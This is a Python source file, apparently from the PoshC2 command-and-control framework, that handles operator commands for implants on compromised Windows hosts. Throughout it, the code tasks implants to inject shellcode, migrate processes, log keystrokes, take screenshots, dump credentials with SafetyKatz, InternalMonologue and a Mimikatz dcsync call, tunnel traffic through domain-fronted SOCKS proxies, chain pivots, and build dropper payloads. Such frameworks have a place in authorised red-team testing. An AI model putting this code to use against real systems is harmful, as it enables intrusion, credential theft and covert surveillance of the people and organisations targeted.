import base64, re, traceback, os, string, subprocess
from prompt_toolkit import PromptSession
from prompt_toolkit.history import FileHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.styles import Style

from poshc2.client.Alias import cs_alias, cs_replace
from poshc2.Colours import Colours
from poshc2.server.AutoLoads import check_module_loaded, run_autoloads_sharp
from poshc2.client.Help import sharp_help, allhelp
from poshc2.server.Config import PoshInstallDirectory, PoshProjectDirectory, SocksHost, PayloadsDirectory, ModulesDirectory
from poshc2.server.Config import PayloadCommsHost, DomainFrontHeader, UserAgent, PBindPipeName, PBindSecret, FCommFileName
from poshc2.Utils import argp, load_file, gen_key, get_first_url, get_first_dfheader
from poshc2.server.Core import print_bad, print_good
from poshc2.client.cli.CommandPromptCompleter import FilePathCompleter
from poshc2.server.payloads.Payloads import Payloads
from poshc2.server.PowerStatus import getpowerstatus
from poshc2.server.database.DB import hide_implant, new_task, kill_implant, get_implantdetails, get_sharpurls, get_baseenckey, get_powerstatusbyrandomuri
from poshc2.server.database.DB import select_item, update_label, get_allurls, get_c2server_all, get_newimplanturl, new_urldetails


def handle_sharp_command(command, user, randomuri, implant_id):
    # alias mapping
    for alias in cs_alias:
        if alias[0] == command[:len(command.rstrip())]:
            command = alias[1]

    # alias replace
    for alias in cs_replace:
        if command.startswith(alias[0]):
            command = command.replace(alias[0], alias[1])

    original_command = command
    command = command.strip()

    run_autoloads_sharp(command, randomuri, user)

    if command.startswith("searchhelp"):
        do_searchhelp(user, command, randomuri)
        return
    elif command.startswith("searchallhelp"):
        do_searchallhelp(user, command, randomuri)
        return
    elif command.startswith("searchhistory"):
        do_searchhistory(user, command, randomuri)
        return
    elif command.startswith("upload-file"):
        do_upload_file(user, command, randomuri)
        return
    elif command.startswith("inject-shellcode"):
        do_inject_shellcode(user, command, randomuri)
        return
    elif command.startswith("migrate"):
        do_migrate(user, command, randomuri)
        return
    elif command == "kill-process":
        do_kill_process(user, command, randomuri)
        return        
    elif command == "kill-implant" or command == "exit":
        do_kill_implant(user, command, randomuri)
        return
    elif command.startswith("sharpsocks"):
        do_sharpsocks(user, command, randomuri)
        return
    elif (command.startswith("stop-keystrokes")):
        do_stop_keystrokes(user, command, randomuri)
        return
    elif (command.startswith("start-keystrokes")):
        do_start_keystrokes(user, command, randomuri)
        return
    elif (command.startswith("get-keystrokes")):
        do_get_keystrokes(user, command, randomuri)
        return
    elif (command.startswith("get-screenshotmulti")):
        do_get_screenshotmulti(user, command, randomuri)
        return
    elif command.startswith("get-screenshot"):
        do_get_screenshot(user, command, randomuri)
        return
    elif command == "getpowerstatus":
        do_get_powerstatus(user, command, randomuri)
        return
    elif command == "stoppowerstatus":
        do_stoppowerstatus(user, command, randomuri)
        return
    elif command.startswith("run-exe SharpWMI.Program") and "execute" in command and "payload" not in command:
        do_sharpwmi_execute(user, command, randomuri)
        return
    elif (command.startswith("get-hash")):
        do_get_hash(user, command, randomuri)
        return
    elif (command.startswith("enable-rotation")):
        do_rotation(user, command, randomuri)
        return
    elif (command.startswith("safetykatz")):
        do_safetykatz(user, command, randomuri)
        return
    elif command.startswith("loadmoduleforce"):
        do_loadmoduleforce(user, command, randomuri)
        return
    elif command.startswith("loadmodule"):
        do_loadmodule(user, command, randomuri)
        return
    elif command.startswith("listmodules"):
        do_listmodules(user, command, randomuri)
        return
    elif command.startswith("modulesloaded"):
        do_modulesloaded(user, command, randomuri)
        return
    elif command.startswith("pbind-connect"):
        do_pbind_start(user, command, randomuri)
        return
    elif command.startswith("fcomm-connect"):
        do_fcomm_start(user, command, randomuri)
        return
    elif command.startswith("dynamic-code"):
        do_dynamic_code(user, command, randomuri)
        return
    elif command.startswith("startdaisy"):
        do_startdaisy(user, command, randomuri)
        return
    elif command.startswith("dcsync"):
        do_dcsync(user, command, randomuri)
        return
    elif command == "help":
        do_help(user, command, randomuri)
        return
    else:
        if command:
            do_shell(user, original_command, randomuri)
        return


def do_searchhelp(user, command, randomuri):
    searchterm = (command).replace("searchhelp ", "")
    helpful = sharp_help.split('\n')
    for line in helpful:
        if searchterm in line.lower():
            print(Colours.GREEN + line)


def do_searchallhelp(user, command, randomuri):
    searchterm = (command).replace("searchallhelp ", "")
    for line in allhelp:
        if searchterm in line.lower():
            print(Colours.GREEN + line)


def do_searchhistory(user, command, randomuri):
    searchterm = (command).replace("searchhistory ", "")
    with open('%s/.implant-history' % PoshProjectDirectory) as hisfile:
        for line in hisfile:
            if searchterm in line.lower():
                print(Colours.GREEN + line.replace("+", ""))


def do_upload_file(user, command, randomuri):
    # TODO lots of common code
    source = ""
    destination = ""
    if command == "upload-file":
        style = Style.from_dict({
            '': '#80d130',
        })
        session = PromptSession(history=FileHistory('%s/.upload-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
        try:
            source = session.prompt("Location file to upload: ", completer=FilePathCompleter(PayloadsDirectory, glob="*"))
            source = PayloadsDirectory + source
        except KeyboardInterrupt:
            return
        while not os.path.isfile(source):
            print("File does not exist: %s" % source)
            source = session.prompt("Location file to upload: ", completer=FilePathCompleter(PayloadsDirectory, glob="*"))
            source = PayloadsDirectory + source
        destination = session.prompt("Location to upload to: ")
    else:
        args = argp(command)
        source = args.source
        destination = args.destination
    try:
        destination = destination.replace("\\", "\\\\")
        print("")
        print("Uploading %s to %s" % (source, destination))
        uploadcommand = f"upload-file {source} {destination}"
        new_task(uploadcommand, user, randomuri)
    except Exception as e:
        print("Error with source file: %s" % e)
        traceback.print_exc()


def do_inject_shellcode(user, command, randomuri):
    params = re.compile("inject-shellcode", re.IGNORECASE)
    params = params.sub("", command)
    style = Style.from_dict({
        '': '#80d130',
    })
    session = PromptSession(history=FileHistory('%s/.shellcode-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
    try:
        path = session.prompt("Location of shellcode file: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.bin"))
        path = PayloadsDirectory + path
    except KeyboardInterrupt:
        return
    try:
        shellcodefile = load_file(path)
        if shellcodefile is not None:
            new_task("run-exe Core.Program Core Inject-Shellcode %s%s #%s" % (base64.b64encode(shellcodefile).decode("utf-8"), params, os.path.basename(path)), user, randomuri)
    except Exception as e:
        print("Error loading file: %s" % e)

def do_migrate(user, command, randomuri):
    params = re.compile("migrate", re.IGNORECASE)
    params = params.sub("", command)
    implant = get_implantdetails(randomuri)
    implant_arch = implant.Arch
    implant_comms = implant.Pivot
    if implant_arch == "AMD64":
        arch = "64"
    else:
        arch = "86"
    if implant_comms == "C#":
        path = "%sSharp_v4_x%s_Shellcode.bin" % (PayloadsDirectory, arch)
        shellcodefile = load_file(path)
    elif "Daisy" in implant_comms:
        daisyname = input("Name required: ")
        path = "%s%sSharp_v4_x%s_Shellcode.bin" % (PayloadsDirectory, daisyname, arch)
        shellcodefile = load_file(path)
    elif "Proxy" in implant_comms:
        path = "%sProxySharp_v4_x%s_Shellcode.bin" % (PayloadsDirectory, arch)
        shellcodefile = load_file(path)
    new_task("run-exe Core.Program Core Inject-Shellcode %s%s #%s" % (base64.b64encode(shellcodefile).decode("utf-8"), params, os.path.basename(path)), user, randomuri)


def do_kill_process(user, command, randomuri):
    impid = get_implantdetails(randomuri)
    print_bad("**OPSEC Warning** - kill-process will terminate the entire process, if you want to kill the thread only use kill-implant")
    ri = input("Are you sure you want to terminate the implant ID %s? (Y/n) " % impid.ImplantID)
    if ri.lower() == "n":
        print("Implant not terminated")
    if ri == "" or ri.lower() == "y":
        pid = impid.PID
        new_task("kill-process %s" % (pid), user, randomuri)
        kill_implant(randomuri)


def do_kill_implant(user, command, randomuri):
    impid = get_implantdetails(randomuri)
    print_bad("**OPSEC Warning** - kill-implant terminates the current threat not the entire process, if you want to kill the process use kill-process")
    ri = input("Are you sure you want to terminate the implant ID %s? (Y/n) " % impid.ImplantID)
    if ri.lower() == "n":
        print("Implant not terminated")
    if ri == "" or ri.lower() == "y":
        pid = impid.PID
        new_task("exit", user, randomuri)
        kill_implant(randomuri)


def do_exit(user, command, randomuri):
    return do_kill_implant(user, command, randomuri)


def do_sharpsocks(user, command, randomuri):
    style = Style.from_dict({
        '': '#80d130',
    })

    from random import choice
    channel = "".join(choice(string.ascii_letters) for _ in range(25))
    sharp_key = gen_key().decode("utf-8")
    default_sharp_urls = get_sharpurls()
    urls_prompt = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.comma-separated-urls-history'), auto_suggest=AutoSuggestFromHistory(), style=style)
    socks_proxy_urls = urls_prompt.prompt(f"What URIs would you like to use for SharpSocks? Default is {default_sharp_urls.replace(' ', '')}: ")
    if not socks_proxy_urls:
        socks_proxy_urls = default_sharp_urls
    socks_proxy_urls = socks_proxy_urls.split(",")
    if len(socks_proxy_urls) < 2:
        print("Please specify at least two URIs")
        return
    socks_proxy_urls = [i.replace("\"", "").strip() for i in socks_proxy_urls]
    socks_proxy_urls = [(i[1:] if i.startswith("/") else i) for i in socks_proxy_urls]

    default_sharp_url = select_item("PayloadCommsHost", "C2Server").replace('"', '').split(',')[0]
    domains_prompt = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.protocol-and-domain-history'), auto_suggest=AutoSuggestFromHistory(), style=style)
    sharp_url = domains_prompt.prompt(f"What domain would you like to use for SharpSocks? Default is {default_sharp_url}: ")
    if not sharp_url:
        sharp_url = default_sharp_url
    if not sharp_url.startswith("http"):
        print("Please specify a protocol (http/https)")
        return

    default_host_header = get_first_dfheader(select_item("DomainFrontHeader", "C2Server"))
    host_headers_prompt = PromptSession(history=FileHistory('%s/.host-headers-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
    host_header = host_headers_prompt.prompt(f"What host header should used? Default is {default_host_header}: ")
    if not host_header:
        host_header = default_host_header

    default_user_agent = select_item("UserAgent", "C2Server")
    user_agent_prompt = PromptSession(history=FileHistory('%s/.user-agents-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
    user_agent = user_agent_prompt.prompt(f"What user agent? Default is \"{default_user_agent}\": ")
    if not user_agent:
        user_agent = default_user_agent

    default_beacon = "200"
    beacon_prompt = PromptSession(history=FileHistory('%s/.beacon-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
    beacon = beacon_prompt.prompt(f"What beacon interval would you like SharpSocks to use (ms)? Default: {default_beacon}ms: ")
    if not beacon:
        beacon = default_beacon
    if beacon.strip().endswith("ms"):
        beacon = beacon.replace("ms", "").strip()

    server_command = f"{PoshInstallDirectory}resources/SharpSocks/SharpSocksServer/SharpSocksServer -c={channel} -k={sharp_key} -l={SocksHost} -v"
    if " -v" in command or " --verbose" in command:
        server_command += " --verbose"
    server_command += "\n"
    print(Colours.GREEN + "\nOk, run this command from your SharpSocksServer directory to launch the SharpSocks server:\n")
    print(server_command)

    task = f"run-exe SharpSocksImplant.Program SharpSocksImplant -s {sharp_url} -c {channel} -k {sharp_key} -url1 {socks_proxy_urls[0]} -url2 {socks_proxy_urls[1]} -b {beacon} -r {beacon} --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken --user-agent \"{user_agent}\""
    if host_header:
        task += f" -df {host_header}"

    extra_args = command.replace("sharpsocks ", "").strip()
    if extra_args:
        task += " " + extra_args

    confirm = input("Are you ready to start the SharpSocks in the implant? (Y/n) ")
    if confirm == "" or confirm.lower() == "y":
        new_task(task, user, randomuri)
    else:
        print("Aborted...")
        return

    print("SharpSocks task issued, to stop SharpSocks run stopsocks")


def do_stop_keystrokes(user, command, randomuri):
    new_task("run-exe Logger.KeyStrokesClass Logger %s" % command, user, randomuri)
    update_label("", randomuri)


def do_start_keystrokes(user, command, randomuri):
    check_module_loaded("Logger.exe", randomuri, user)
    new_task("run-exe Logger.KeyStrokesClass Logger %s" % command, user, randomuri)
    update_label("KEYLOG", randomuri)


def do_get_keystrokes(user, command, randomuri):
    new_task("run-exe Logger.KeyStrokesClass Logger %s" % command, user, randomuri)


def do_get_screenshotmulti(user, command, randomuri):
    pwrStatus = get_powerstatusbyrandomuri(randomuri)
    if (pwrStatus is not None and pwrStatus[7]):
        ri = input("[!] Screen is reported as LOCKED, do you still want to attempt a screenshot? (y/N) ")
        if ri.lower() == "n" or ri.lower() == "":
            return
    new_task(command, user, randomuri)
    update_label("SCREENSHOT", randomuri)


def do_get_screenshot(user, command, randomuri):
    pwrStatus = get_powerstatusbyrandomuri(randomuri)
    if (pwrStatus is not None and pwrStatus[7]):
        ri = input("[!] Screen is reported as LOCKED, do you still want to attempt a screenshot? (y/N) ")
        if ri.lower() == "n" or ri.lower() == "":
            return
    new_task(command, user, randomuri)


def do_get_powerstatus(user, command, randomuri):
    getpowerstatus(randomuri)
    new_task("run-dll PwrStatusTracker.PwrFrm PwrStatusTracker GetPowerStatusResult ", user, randomuri)


def do_stoppowerstatus(user, command, randomuri):
    new_task(command, user, randomuri)
    update_label("", randomuri)


def do_get_hash(user, command, randomuri):
    check_module_loaded("InternalMonologue.exe", randomuri, user)
    new_task("run-exe InternalMonologue.Program InternalMonologue", user, randomuri)


def do_safetykatz(user, command, randomuri):
    new_task("run-exe SafetyKatz.Program %s" % command, user, randomuri)


def do_loadmoduleforce(user, command, randomuri):
    params = re.compile("loadmoduleforce ", re.IGNORECASE)
    params = params.sub("", command)
    check_module_loaded(params, randomuri, user, force=True)


def do_loadmodule(user, command, randomuri):
    params = re.compile("loadmodule ", re.IGNORECASE)
    params = params.sub("", command)
    check_module_loaded(params, randomuri, user)


def do_listmodules(user, command, randomuri):
    modules = os.listdir(ModulesDirectory)
    modules = sorted(modules, key=lambda s: s.lower())
    print("")
    print("[+] Available modules:")
    print("")
    for mod in modules:
        if (".exe" in mod) or (".dll" in mod):
            print(mod)


def do_modulesloaded(user, command, randomuri):
    implant_details = get_implantdetails(randomuri)
    print(implant_details.ModsLoaded)
    new_task("listmodules", user, randomuri)


def do_help(user, command, randomuri):
    print(sharp_help)


def do_shell(user, command, randomuri):
    new_task(command, user, randomuri)


def do_rotation(user, command, randomuri):
    domain = input("Domain or URL in array format: \"https://www.example.com\",\"https://www.example2.com\" ")
    domainfront = input("Domain front URL in array format: \"fjdsklfjdskl.cloudfront.net\",\"jobs.azureedge.net\" ")
    new_task("dfupdate %s" % domainfront, user, randomuri)
    new_task("rotate %s" % domain, user, randomuri)


def do_sharpwmi_execute(user, command, randomuri):
    style = Style.from_dict({'': '#80d130'})
    session = PromptSession(history=FileHistory('%s/.shellcode-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
    try:
        path = session.prompt("Location of base64 vbs/js file: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.b64"))
        path = PayloadsDirectory + path
    except KeyboardInterrupt:
        return
    if os.path.isfile(path):
        with open(path, "r") as p:
            payload = p.read()
        new_task("%s payload=%s" % (command, payload), user, randomuri)
    else:
        print_bad("Could not find file")


def do_pbind_start(user, command, randomuri):
    key = get_baseenckey()
    if len(command.split()) == 2:  # 'pbind-connect <hostname>' is two args
        command = f"{command} {PBindPipeName} {PBindSecret} {key}"
    elif len(command.split()) == 4:  # if the pipe name and secret are already present just add the key
        command = f"{command} {key}"
    else:
        print_bad("Expected 'pbind_connect <hostname>' or 'pbind_connect <hostname> <pipename> <secret>'")
        return
    new_task(command, user, randomuri)


def do_fcomm_start(user, command, randomuri):
    key = get_baseenckey()
    if len(command.split()) == 1:  # 'fcomm-connect' is one args
        command = f"{command} {FCommFileName} {key}"
    elif len(command.split()) == 2:  # if the file name is already there then just add the key
        command = f"{command} {key}"
    else:
        print_bad("Expected 'fcomm_connect' or 'fcomm_connect <filename>'")
        return
    new_task(command, user, randomuri)


def do_dynamic_code(user, command, randomuri):
    compile_command = "mono-csc %sDynamicCode.cs -out:%sPoshC2DynamicCode.exe -target:exe -warn:2 -sdk:4" % (PayloadsDirectory, PayloadsDirectory)
    try:
        subprocess.check_output(compile_command, shell=True)
    except subprocess.CalledProcessError:
        return
    command = command.replace("dynamic-code", "").strip()
    check_module_loaded(f"{PayloadsDirectory}PoshC2DynamicCode.exe", randomuri, user, force=True)
    new_task(f"run-exe PoshC2DynamicCode.Program PoshC2DynamicCode {command}", user, randomuri)


def do_startdaisy(user, command, randomuri):
    check_module_loaded("daisy.dll", randomuri, user)

    elevated = input(Colours.GREEN + "Are you elevated? Y/n " + Colours.END)

    domain_front = ""
    proxy_user = ""
    proxy_pass = ""
    proxy_url = ""
    cred_expiry = ""

    if elevated.lower() == "n":
        cont = input(Colours.RED + "Daisy from an unelevated context can only bind to localhost, continue? y/N " + Colours.END)
        if cont.lower() == "n" or cont == "":
            return

        bind_ip = "localhost"

    else:
        bind_ip = input(Colours.GREEN + "Bind IP on the daisy host: " + Colours.END)

    bind_port = input(Colours.GREEN + "Bind Port on the daisy host: " + Colours.END)
    firstdaisy = input(Colours.GREEN + "Is this the first daisy in the chain? Y/n? " + Colours.END)
    default_url = get_first_url(PayloadCommsHost, DomainFrontHeader)
    default_df_header = get_first_dfheader(DomainFrontHeader)
    if default_df_header == default_url:
        default_df_header = None
    if firstdaisy.lower() == "y" or firstdaisy == "":
        upstream_url = input(Colours.GREEN + f"C2 URL (leave blank for {default_url}): " + Colours.END)
        domain_front = input(Colours.GREEN + f"Domain front header (leave blank for {str(default_df_header)}): " + Colours.END)
        proxy_user = input(Colours.GREEN + "Proxy user (<domain>\\<username>, leave blank if none): " + Colours.END)
        proxy_pass = input(Colours.GREEN + "Proxy password (leave blank if none): " + Colours.END)
        proxy_url = input(Colours.GREEN + "Proxy URL (leave blank if none): " + Colours.END)
        cred_expiry = input(Colours.GREEN + "Password/Account Expiration Date: .e.g. 15/03/2018: ")

        if not upstream_url:
            upstream_url = default_url
        if not domain_front:
            if default_df_header:
                domain_front = default_df_header
            else:
                domain_front = ""

    else:
        upstream_daisy_host = input(Colours.GREEN + "Upstream daisy server:  " + Colours.END)
        upstream_daisy_port = input(Colours.GREEN + "Upstream daisy port:  " + Colours.END)
        upstream_url = f"http://{upstream_daisy_host}:{upstream_daisy_port}"
        domain_front = upstream_daisy_host

    urls = get_allurls().replace(" ", "")
    useragent = UserAgent
    command = f"invoke-daisychain \"{bind_ip}\" \"{bind_port}\" {upstream_url} \"{domain_front}\" \"{proxy_url}\" \"{proxy_user}\" \"{proxy_pass}\" \"{useragent}\" {urls}"

    new_task(command, user, randomuri)
    update_label("DaisyHost", randomuri)

    createpayloads = input(Colours.GREEN + "Would you like to create payloads for this Daisy Server? Y/n ")

    if createpayloads.lower() == "y" or createpayloads == "":
        name = input(Colours.GREEN + "Enter a payload name: " + Colours.END)

        daisyhost = get_implantdetails(randomuri)
        proxynone = "if (!$proxyurl){$wc.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()}"
        C2 = get_c2server_all()
        urlId = new_urldetails(name, f"\"http://{bind_ip}:{bind_port}\"", "\"\"", proxy_url, proxy_user, proxy_pass, cred_expiry)
        newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, C2.UserAgent, C2.Referrer, "%s?d" % get_newimplanturl(), PayloadsDirectory, PowerShellProxyCommand=proxynone,
                              URLID=urlId)
        newPayload.PSDropper = (newPayload.PSDropper).replace("$pid;%s" % (upstream_url), "$pid;%s@%s" % (daisyhost.User, daisyhost.Domain))
        newPayload.CreateDroppers(name)
        newPayload.CreateRaw(name)
        newPayload.CreateDlls(name)
        newPayload.CreateShellcode(name)
        newPayload.CreateDonutShellcode(name)
        newPayload.CreateEXE(name)
        newPayload.CreateMsbuild(name)
        print_good("Created new %s daisy payloads" % name)


def do_dcsync(user, command, randomuri):
    params = re.compile("dcsync ", re.IGNORECASE)
    params = params.sub("", command)
    res = params.split()
    domain = res[0]
    dcsync_user = res[1]
    new_task(f"run-dll SharpSploit.Credentials.Mimikatz SharpSploit Command \"\\\"lsadump::dcsync /domain:{domain} /user:{dcsync_user}\\\"\"", user, randomuri)
